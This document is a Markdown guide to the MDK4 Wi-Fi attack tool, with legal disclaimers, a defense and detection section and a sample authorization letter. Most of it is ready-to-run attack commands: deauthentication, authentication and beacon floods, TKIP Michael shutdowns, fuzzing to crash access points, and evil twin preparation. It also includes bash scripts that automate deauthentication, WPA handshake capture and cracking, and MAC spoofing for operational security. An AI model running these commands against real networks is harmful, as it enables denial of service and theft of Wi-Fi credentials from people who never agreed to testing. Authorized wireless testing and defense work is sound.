# MDK4 Complete Guide

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**

MDK4 is a powerful wireless security testing tool. Using it against networks you don't own or have explicit written permission to test is **ILLEGAL** in most jurisdictions and may result in:
- Criminal prosecution
- Heavy fines
- Imprisonment
- Civil liability

**ONLY use MDK4 on:**
- Networks you own
- Test lab environments
- Networks where you have explicit written authorization
- Educational environments with proper supervision

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Concepts](#basic-concepts)
4. [Attack Modes](#attack-modes)
5. [Practical Examples](#practical-examples)
6. [Defense and Detection](#defense-and-detection)
7. [Troubleshooting](#troubleshooting)
8. [Legal Considerations](#legal-considerations)

---

## Introduction

### What is MDK4?

MDK4 (Murder Death Kill 4) is a proof-of-concept tool designed to exploit vulnerabilities in IEEE 802.11 (Wi-Fi) protocols. It's used for:
- Wireless security testing
- Stress testing wireless networks
- Demonstrating wireless vulnerabilities
- Educational purposes

### Key Features

- **Multiple attack modes** targeting different aspects of 802.11 protocols
- **Active attacks** against access points and clients
- **Denial of service** testing capabilities
- **Protocol exploitation** demonstrations
- **WPA/WPA2/WPA3** targeting options

### MDK4 vs MDK3

MDK4 is the successor to MDK3 with:
- Better performance
- More attack modes
- Improved stability
- Active development
- Support for newer wireless standards

---

## Installation

### Prerequisites

```bash
# Required packages (Debian/Ubuntu)
sudo apt update
sudo apt install -y build-essential libpcap-dev pkg-config libnl-3-dev libnl-genl-3-dev

# For Arch Linux
sudo pacman -S base-devel libpcap libnl

# For Fedora/RHEL
sudo dnf install gcc make libpcap-devel libnl3-devel
```

### Installing from Source

```bash
# Clone the repository
git clone https://github.com/aircrack-ng/mdk4.git
cd mdk4

# Build
make

# Install (optional)
sudo make install
```

### Verifying Installation

```bash
# Check if installed
mdk4 --help

# Check version
mdk4 --version

# List wireless interfaces
iw dev
```

### Setting Up Monitor Mode

MDK4 requires your wireless adapter to be in monitor mode:

```bash
# Method 1: Using airmon-ng (recommended)
sudo airmon-ng start wlan0

# This creates a monitor interface like wlan0mon

# Method 2: Using iw
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig
```

---

## Basic Concepts

### Understanding Wireless Attacks

**Authentication Flood**: Overwhelms access points with authentication requests
**Deauthentication**: Forces clients to disconnect from networks
**Beacon Flooding**: Creates fake access points
**Probe Request Flooding**: Generates excessive probe requests
**Michael Countermeasures**: Exploits WPA/TKIP vulnerabilities

### Channel Selection

```bash
# View available channels
iw list | grep -A 15 Frequencies

# Set specific channel
sudo iw dev wlan0mon set channel 6
```

### MAC Address Randomization

```bash
# Change MAC address (recommended for testing)
sudo ip link set wlan0mon down
sudo macchanger -r wlan0mon
sudo ip link set wlan0mon up
```

---

## Attack Modes

### Mode Overview

```
MDK4 Attack Modes:
  b - Beacon Flooding
  a - Authentication DoS
  p - Probe Request Flooding
  d - Deauthentication and Disassociation
  m - Michael Countermeasures Exploitation
  e - EAPOL Start/Logoff Packet Injection
  s - Attacks for IEEE 802.11s mesh networks
  w - WIDS Confusion
  f - Packet Fuzzer
  x - Advanced 802.1X attacks
```

---

### Mode B: Beacon Flooding

**Purpose**: Creates multiple fake access points to confuse clients and wireless scanners.

#### Basic Syntax
```bash
mdk4 <interface> b [options]
```

#### Options
```
-n <ssid>        Use SSID instead of randomly generated ones
-f <filename>    Read SSIDs from file
-v <filename>    Read MACs from file (BSSID)
-t <filename>    Read MACs from file (transmitter MAC)
-a               Use valid WPA TKIP tags (makes APs appear more legitimate)
-w               Use valid WPA2 tags
-q               Use valid WPA3 tags
-c <channel>     Create APs on channel (default: current channel)
-h               Hop to channel where AP is spoofed
-s <pps>         Set speed in packets per second (default: 50)
-m               Use valid MAC addresses from OUI database
```

#### Examples

**Basic beacon flood:**
```bash
sudo mdk4 wlan0mon b -s 100
```

**Beacon flood with custom SSIDs:**
```bash
# Create SSID file
echo "Free WiFi" > ssids.txt
echo "Guest Network" >> ssids.txt
echo "Corporate WiFi" >> ssids.txt

sudo mdk4 wlan0mon b -f ssids.txt -s 200
```

**WPA2 beacon flood (more realistic):**
```bash
sudo mdk4 wlan0mon b -w -s 50 -c 6
```

**Channel hopping beacon flood:**
```bash
sudo mdk4 wlan0mon b -w -h -s 100
```

#### Use Cases
- Testing wireless scanner/detection tools
- Demonstrating SSID confusion attacks
- Testing client connection behavior
- Wireless IDS testing

---

### Mode A: Authentication DoS

**Purpose**: Floods access points with authentication requests to exhaust resources.

#### Basic Syntax
```bash
mdk4 <interface> a [options]
```

#### Options
```
-a <bssid>       Target specific access point
-m               Use valid MAC from OUI database (more realistic)
-i <bssid>       Ignore these BSSIDs (comma separated)
-s <pps>         Set speed in packets per second
```

#### Examples

**Target specific AP:**
```bash
# First, find target BSSID
sudo airodump-ng wlan0mon

# Attack specific AP
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -s 300
```

**Attack all APs except specified:**
```bash
sudo mdk4 wlan0mon a -i 00:11:22:33:44:55,AA:BB:CC:DD:EE:FF -s 200
```

**High-speed authentication flood:**
```bash
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -m -s 500
```

#### Impact
- AP resource exhaustion
- Legitimate client authentication delays
- Potential AP crash/reboot
- Network unavailability

---

### Mode P: Probe Request Flooding

**Purpose**: Sends mass probe requests to test AP response and enumerate SSIDs.

#### Basic Syntax
```bash
mdk4 <interface> p [options]
```

#### Options
```
-e <ssid>        Use SSID
-f <filename>    Read SSIDs from file
-t <bssid>       Set target AP MAC address
-s <pps>         Set speed in packets per second
```

#### Examples

**Basic probe flood:**
```bash
sudo mdk4 wlan0mon p -e "TargetNetwork" -s 100
```

**Probe multiple SSIDs:**
```bash
echo "Network1" > probes.txt
echo "Network2" >> probes.txt
echo "Network3" >> probes.txt

sudo mdk4 wlan0mon p -f probes.txt -s 200
```

**Target specific AP:**
```bash
sudo mdk4 wlan0mon p -e "CorporateWiFi" -t 00:11:22:33:44:55 -s 150
```

#### Use Cases
- Testing AP probe response behavior
- SSID enumeration resistance testing
- Wireless IDS probe detection testing
- Client tracking countermeasures testing

---

### Mode D: Deauthentication/Disassociation

**Purpose**: Forces clients to disconnect from access points.

#### Basic Syntax
```bash
mdk4 <interface> d [options]
```

#### Options
```
-b <bssid>       BSSID of target AP (use multiple -b for multiple targets)
-s <bssid>       BSSID of AP to save (whitelist)
-c <channel>     Channel to operate on
-B <filename>    Read BSSIDs from file to attack
-S <filename>    Read BSSIDs from file to save (whitelist)
-w <filename>    Read victim client MACs from file
-x <pps>         Packets per second (default: unlimited)
```

#### Examples

**Deauth specific AP:**
```bash
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -c 6
```

**Deauth all APs on channel:**
```bash
sudo mdk4 wlan0mon d -c 11
```

**Deauth specific client from AP:**
```bash
# Create client file
echo "AA:BB:CC:DD:EE:FF" > clients.txt

sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -w clients.txt -c 6
```

**Whitelist-based deauth (attack all except listed):**
```bash
# Create whitelist
echo "00:11:22:33:44:55" > whitelist.txt
echo "AA:BB:CC:DD:EE:FF" >> whitelist.txt

sudo mdk4 wlan0mon d -S whitelist.txt -c 6
```

**Rate-limited deauth:**
```bash
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -x 10 -c 6
```

#### Attack Mechanisms
- **Unicast deauth**: Targets specific client
- **Broadcast deauth**: Targets all clients on AP
- **Disassociation**: Alternative to deauthentication
- **Continuous**: Prevents reconnection

#### Common Uses
- WPA handshake capture (for password analysis)
- Client device discovery
- Testing roaming behavior
- Evil twin attack preparation

---

### Mode M: Michael Countermeasures Exploitation

**Purpose**: Exploits WPA-TKIP Michael countermeasure mechanism to cause temporary network shutdown.

#### Basic Syntax
```bash
mdk4 <interface> m [options]
```

#### Options
```
-t <bssid>       Target AP BSSID
-j               Use the new QoS exploit
-s <pps>         Packets per second
```

#### Background

WPA-TKIP includes Michael MIC (Message Integrity Check). When two Michael failures occur within 60 seconds:
- AP shuts down for 60 seconds
- All clients are disconnected
- Network becomes unavailable

#### Examples

**Basic Michael exploit:**
```bash
sudo mdk4 wlan0mon m -t 00:11:22:33:44:55
```

**Michael exploit with QoS:**
```bash
sudo mdk4 wlan0mon m -t 00:11:22:33:44:55 -j
```

**High-speed Michael attack:**
```bash
sudo mdk4 wlan0mon m -t 00:11:22:33:44:55 -s 300 -j
```

#### Requirements
- Target must use WPA-TKIP (not WPA2-AES)
- AP must have Michael countermeasures enabled
- Target must have active clients

#### Note
**This attack is largely obsolete** as modern networks use WPA2/WPA3 with AES, not TKIP.

---

### Mode E: EAPOL Start/Logoff

**Purpose**: Sends EAPOL packets to manipulate 802.1X authentication state.

#### Basic Syntax
```bash
mdk4 <interface> e [options]
```

#### Options
```
-t <bssid>       Target AP BSSID
-s <pps>         Packets per second
-l               Send EAPOL logoff instead of start
```

#### Examples

**EAPOL start flood:**
```bash
sudo mdk4 wlan0mon e -t 00:11:22:33:44:55 -s 100
```

**EAPOL logoff attack:**
```bash
sudo mdk4 wlan0mon e -t 00:11:22:33:44:55 -l -s 50
```

#### Use Cases
- Testing enterprise wireless (802.1X) authentication
- RADIUS server stress testing
- EAP state machine testing
- Authentication timeout testing

---

### Mode S: 802.11s Mesh Network Attacks

**Purpose**: Attacks IEEE 802.11s mesh networks.

#### Basic Syntax
```bash
mdk4 <interface> s [options]
```

#### Options
```
-f <filename>    Read mesh IDs from file
-b <bssid>       Target specific mesh node
```

#### Examples

**Basic mesh attack:**
```bash
echo "MeshNetwork1" > meshids.txt
echo "MeshNetwork2" >> meshids.txt

sudo mdk4 wlan0mon s -f meshids.txt
```

**Target specific mesh node:**
```bash
sudo mdk4 wlan0mon s -b 00:11:22:33:44:55
```

#### Background
802.11s defines wireless mesh networking where nodes can:
- Act as routers
- Forward traffic for other nodes
- Self-configure and self-heal

Attacks can disrupt mesh formation and routing.

---

### Mode W: WIDS Confusion

**Purpose**: Attempts to confuse and evade Wireless Intrusion Detection Systems (WIDS).

#### Basic Syntax
```bash
mdk4 <interface> w [options]
```

#### Options
```
-e <ssid>        SSID to use
-c <channel>     Channel to use
-z               Use random MAC addresses
-s <pps>         Packets per second
```

#### Examples

**Basic WIDS confusion:**
```bash
sudo mdk4 wlan0mon w -e "TestNetwork" -c 6 -z
```

**High-speed WIDS evasion test:**
```bash
sudo mdk4 wlan0mon w -e "CorporateNet" -c 11 -z -s 200
```

#### Techniques
- Spoofed management frames
- Invalid frame sequences
- MAC address randomization
- Malformed packets

#### Purpose
Testing if WIDS can:
- Detect spoofed frames
- Correlate attack patterns
- Alert on anomalies
- Track attackers

---

### Mode F: Packet Fuzzer

**Purpose**: Sends malformed/random packets to test AP stability and crash detection.

#### Basic Syntax
```bash
mdk4 <interface> f [options]
```

#### Options
```
-s <pps>         Packets per second
-t <bssid>       Target AP BSSID
-m <mac>         Source MAC address
```

#### Examples

**Basic fuzzing:**
```bash
sudo mdk4 wlan0mon f -t 00:11:22:33:44:55 -s 100
```

**High-speed fuzzing:**
```bash
sudo mdk4 wlan0mon f -t 00:11:22:33:44:55 -s 500
```

**Fuzzing with random source:**
```bash
sudo mdk4 wlan0mon f -t 00:11:22:33:44:55 -m 00:00:00:00:00:00 -s 200
```

#### What Gets Fuzzed
- Frame headers
- Management frame contents
- Information elements
- Frame lengths
- Sequence numbers

#### Goals
- Find AP implementation bugs
- Crash vulnerable devices
- Test error handling
- Discover memory corruption issues

---

### Mode X: 802.1X Attacks

**Purpose**: Advanced attacks against 802.1X authentication mechanisms.

#### Basic Syntax
```bash
mdk4 <interface> x [options]
```

#### Options
```
-t <bssid>       Target AP BSSID
-s <pps>         Packets per second
-n <count>       Number of identities to try
```

#### Examples

**Basic 802.1X attack:**
```bash
sudo mdk4 wlan0mon x -t 00:11:22:33:44:55
```

**Identity enumeration:**
```bash
sudo mdk4 wlan0mon x -t 00:11:22:33:44:55 -n 100
```

#### Targets
- EAP-TLS
- PEAP
- EAP-TTLS
- EAP-FAST

---

## Practical Examples

### Example 1: Capture WPA Handshake

**Goal**: Force clients to reconnect to capture 4-way handshake for offline analysis.

```bash
# Step 1: Start monitor mode
sudo airmon-ng start wlan0

# Step 2: Identify target network
sudo airodump-ng wlan0mon

# Step 3: Start capturing on target channel
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Step 4: In another terminal, deauth clients
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -c 6

# Step 5: Wait for handshake in airodump-ng
# Look for "WPA handshake: 00:11:22:33:44:55"

# Step 6: Stop deauth (Ctrl+C)
```

### Example 2: Test WIDS Detection

**Goal**: Verify wireless IDS can detect deauthentication attacks.

```bash
# Start slow deauth attack
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -x 5 -c 6

# Monitor WIDS alerts
# Gradually increase rate to test detection threshold
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -x 50 -c 6
```

### Example 3: Evil Twin Preparation

**Goal**: Deauth clients to force reconnection to your evil twin AP.

```bash
# Terminal 1: Run your evil twin AP (e.g., with hostapd)
# ...

# Terminal 2: Deauth clients from legitimate AP
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -c 6

# Clients will disconnect and potentially connect to your evil twin
```

### Example 4: Stress Test Access Point

**Goal**: Test AP behavior under authentication flood.

```bash
# Start with low rate
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -s 50

# Monitor AP behavior (response time, stability)
# Gradually increase to find threshold
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -s 200
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -s 500
```

### Example 5: Test Client Roaming

**Goal**: Force clients to roam between APs to test roaming behavior.

```bash
# Identify client and connected AP
sudo airodump-ng wlan0mon

# Deauth from current AP
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55 -w client_mac.txt

# Observe which AP client connects to next
# Repeat to test roaming decision algorithm
```

---

## Defense and Detection

### Detecting MDK4 Attacks

#### Signs of Attack
1. **Sudden client disconnections**
2. **High deauthentication frame count**
3. **Fake SSIDs appearing**
4. **Authentication request floods**
5. **Network performance degradation**

#### Detection Tools

**Kismet** - Wireless IDS
```bash
sudo kismet -c wlan0
# Look for alerts on deauth floods, beacon floods
```

**Wireshark** - Packet analysis
```bash
sudo wireshark -i wlan0mon

# Display filters:
wlan.fc.type_subtype == 0x0c  # Deauthentication
wlan.fc.type_subtype == 0x08  # Beacon
wlan.fc.type_subtype == 0x0b  # Authentication
```

**Commercial WIDS**
- Aruba RFProtect
- Cisco Adaptive wIPS
- Fortinet FortiAP
- Motorola AirDefense

### Mitigation Strategies

#### 802.11w - Management Frame Protection (MFP)

**Best defense against deauth attacks:**

```bash
# Configure in hostapd.conf
ieee80211w=2  # Required (1=optional, 2=required)
```

**Requirements:**
- WPA2 or WPA3
- Both AP and client must support 802.11w
- Enabled by default in WPA3

#### Access Point Configuration

**Rate limiting:**
```
# Many enterprise APs support:
- Authentication request limits
- Probe response limits
- Association limits per client
```

**Client isolation:**
```
# Prevent clients from seeing each other
# Reduces attack surface
```

**Hidden SSID:**
```
# Doesn't prevent attacks but reduces casual targeting
# Not a security measure, just obscurity
```

#### Network Architecture

**Multiple SSIDs:**
- Separate critical devices to different SSIDs
- Isolate guest networks
- Use VLANs for segmentation

**AP Placement:**
- Minimize signal outside facility
- Use directional antennas where appropriate
- Conduct site surveys

**Monitoring:**
- Deploy WIDS
- Monitor authentication logs
- Alert on anomalies
- Regular security audits

#### Client-Side Protection

**Use WPA3:**
- Better encryption
- Protected Management Frames (PMF) required
- SAE (Simultaneous Authentication of Equals)

**VPN:**
- Encrypts traffic even if WiFi is compromised
- Protects against evil twin attacks
- Mandatory for sensitive communications

**Update drivers/firmware:**
- Patches for known vulnerabilities
- Better 802.11w support
- Improved security features

---

## Troubleshooting

### Common Issues

#### "Interface not in monitor mode"

```bash
# Solution: Enable monitor mode
sudo airmon-ng start wlan0

# Or manually
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

#### "No such device"

```bash
# Check interface name
iw dev
iwconfig

# Interface might be named differently (wlan1, wlp3s0, etc.)
```

#### "Operation not permitted"

```bash
# Run with sudo
sudo mdk4 wlan0mon d -b 00:11:22:33:44:55

# Or give capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/local/bin/mdk4
```

#### Attack doesn't seem to work

**Possible causes:**

1. **Wrong channel**
```bash
# Make sure you're on same channel as target
sudo iw dev wlan0mon set channel 6
```

2. **802.11w enabled on target**
```bash
# Check with airodump-ng
# Look for "MFP" in output
# Can't deauth 802.11w-protected clients
```

3. **Distance/signal strength**
```bash
# Check if you can see target
sudo airodump-ng wlan0mon

# Move closer if signal is weak
```

4. **Driver issues**
```bash
# Some drivers don't support injection
# Test injection capability:
sudo aireplay-ng --test wlan0mon

# Look for "Injection is working!"
```

#### Low packet rate

```bash
# Check for processes interfering
sudo airmon-ng check kill

# This kills NetworkManager, wpa_supplicant, dhclient, etc.
```

### Hardware Compatibility

#### Recommended Chipsets

**Highly compatible:**
- Atheros AR9271 (TP-Link TL-WN722N v1)
- Ralink RT3070 (Alfa AWUS036NH)
- Ralink RT5372 (Alfa AWUS036NHA)
- Atheros AR9271 (Alfa AWUS036NHA)
- Realtek RTL8812AU (Alfa AWUS036ACH)

**Not recommended:**
- Broadcom chipsets (poor injection support)
- Many built-in laptop cards
- USB adapters with Realtek RTL8188* (hit or miss)

#### Testing Your Adapter

```bash
# Check chipset
lsusb
# or
lspci

# Test monitor mode
sudo airmon-ng start wlan0

# Test injection
sudo aireplay-ng --test wlan0mon

# Expected output:
# Injection is working!
# Found X APs
```

---

## Advanced Techniques

### Scripting MDK4 Attacks

```bash
#!/bin/bash
# Auto-deauth script

INTERFACE="wlan0mon"
CHANNEL=6
TARGET_BSSID="00:11:22:33:44:55"

# Start monitor mode
sudo airmon-ng start wlan0

# Set channel
sudo iw dev $INTERFACE set channel $CHANNEL

# Run deauth for 60 seconds then stop
timeout 60 sudo mdk4 $INTERFACE d -b $TARGET_BSSID -c $CHANNEL

# Stop monitor mode
sudo airmon-ng stop $INTERFACE

echo "Attack completed"
```

### Combining with Aircrack Suite

```bash
#!/bin/bash
# Automated handshake capture

TARGET="00:11:22:33:44:55"
CHANNEL=6
INTERFACE="wlan0mon"

# Start capture
sudo airodump-ng -c $CHANNEL --bssid $TARGET -w capture $INTERFACE &
AIRODUMP_PID=$!

# Wait 5 seconds for airodump to start
sleep 5

# Deauth for 30 seconds
timeout 30 sudo mdk4 $INTERFACE d -b $TARGET -c $CHANNEL

# Stop capture
sudo kill $AIRODUMP_PID

# Check for handshake
sudo aircrack-ng -w /path/to/wordlist.txt capture*.cap
```

### Channel Hopping Strategy

```bash
#!/bin/bash
# Attack all channels sequentially

INTERFACE="wlan0mon"
CHANNELS="1 6 11"  # Common 2.4GHz channels

for CHANNEL in $CHANNELS; do
    echo "Attacking channel $CHANNEL"
    sudo iw dev $INTERFACE set channel $CHANNEL
    timeout 20 sudo mdk4 $INTERFACE d -c $CHANNEL
done
```

---

## Legal Considerations

### United States

**Computer Fraud and Abuse Act (CFAA)**
- Unauthorized access to computer systems is a federal crime
- Penalties up to 10+ years imprisonment
- Civil liability possible

**Federal Communications Commission (FCC)**
- Intentional interference with wireless communications is illegal
- Fines up to $10,000 per violation

### European Union

**Computer Misuse Act (varies by country)**
- UK: Computer Misuse Act 1990
- Germany: Strafgesetzbuch §202a-c
- France: Loi Godfrain

### Authorized Testing Requirements

**Written authorization must include:**
- Specific networks to be tested
- Date/time ranges
- Attack types permitted
- Emergency contact information
- Scope limitations
- Data handling procedures

**Example authorization letter elements:**
```
I, [Name], [Title] at [Organization], authorize [Tester] to conduct
wireless security testing on the following networks:

- SSID: [Network Name]
- BSSID: [MAC Address]
- Location: [Physical Address]
- Date Range: [Start] to [End]
- Permitted Activities: [List specific attacks]
- Prohibited Activities: [List restrictions]

This authorization is valid only for the specified scope above.

Signature: _______________  Date: __________
```

### Safe Testing Environments

**Create your own lab:**
```bash
# Use your own equipment:
- Consumer AP (TP-Link, Netgear, etc.)
- Raspberry Pi as AP
- Virtual wireless networks
- Isolated/Faradayed environment
```

**Online platforms:**
- HackTheBox (wireless challenges)
- TryHackMe (WiFi rooms)
- PentesterLab (wireless courses)
- Offensive Security labs (WiFu course)

---

## Best Practices

### Ethical Testing

1. **Always get written authorization**
2. **Stay within scope**
3. **Document everything**
4. **Report findings professionally**
5. **Don't exceed authorized access**

### Operational Security

```bash
# Change MAC address
sudo macchanger -r wlan0mon

# Use a dedicated testing machine
# Don't use personal/work devices for testing

# Disable network services that might leak identity
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

### Documentation

**Keep records of:**
- Authorization documents
- Testing dates/times
- Commands executed
- Results observed
- Findings discovered
- Communications with client

---

## Resources

### Official Documentation
- MDK4 GitHub: https://github.com/aircrack-ng/mdk4
- Aircrack-ng Wiki: https://www.aircrack-ng.org/

### Learning Resources
- Offensive Security WiFu (PEN-210)
- SANS SEC617: Wireless Penetration Testing
- eLearnSecurity WAPT: Wireless Attack and Penetration Testing

### Community
- /r/AskNetsec
- /r/WirelessHacking (educational)
- Aircrack-ng Forums

### Related Tools
- Aircrack-ng suite
- Wifite
- Fluxion
- Bettercap
- Kismet

---

## Conclusion

MDK4 is a powerful tool for wireless security testing. Remember:

✅ **DO:**
- Use on your own networks
- Get written authorization
- Test in controlled environments
- Document your activities
- Report vulnerabilities responsibly

❌ **DON'T:**
- Attack networks without permission
- Use for malicious purposes
- Ignore legal requirements
- Exceed authorized scope
- Forget to stop monitor mode when done

**Final command to restore normal wireless operation:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

**Last Updated**: 2025
**Version**: 1.0
**Author**: Security Education Project
**License**: Educational Use Only

For questions about wireless security testing, consult with qualified security professionals and legal counsel.
